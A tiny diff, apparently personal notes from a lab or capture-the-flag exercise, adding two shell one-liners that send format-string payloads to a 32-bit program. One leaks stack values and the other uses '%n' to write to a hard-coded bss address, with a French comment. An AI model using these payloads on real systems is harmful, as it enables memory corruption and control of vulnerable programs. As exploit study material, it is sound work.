@@ -1,0 +1,3 @@
+echo AAAA$(python -c 'print "%08x."*20')
+
+echo $(python -c "print 'A' * 60 + '\x8c\x98\x04\x08' + '%x ' * 20 + '%n'") print 64 chars + %n a l addresse de _m (globale nin initialisee donc dans bss)
